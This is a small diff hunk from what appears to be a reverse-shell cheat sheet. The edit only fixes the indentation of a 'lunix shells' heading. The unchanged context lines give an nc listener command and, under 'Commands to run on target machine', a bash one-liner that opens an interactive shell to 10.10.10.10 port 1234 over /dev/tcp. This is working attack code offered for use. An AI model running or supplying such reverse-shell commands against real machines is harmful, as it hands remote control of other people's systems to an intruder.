@@ -17,7 +17,7 @@ nc -lvnp <port-number>
 
 Commands to run on target machine:
 
-	lunix shells:
+lunix shells:
 ``` bash
 
 	bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
